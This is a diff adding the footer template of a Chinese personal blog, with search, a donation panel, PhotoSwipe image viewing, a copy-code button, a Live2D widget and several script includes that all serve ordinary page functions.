+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="/js/jquery.js"></script>
+<link
+  rel="stylesheet"
+  href="/css/jquery.modal.min.css"
+/>
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="/js/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="/js/clipboard.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>复制</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = '复制成功';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = '复制';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = '复制失败';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = '复制';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false});</script></body>
+<script type="text/javascript" src="/js/crash_cheat.js"></script>
+</script>
+</html>
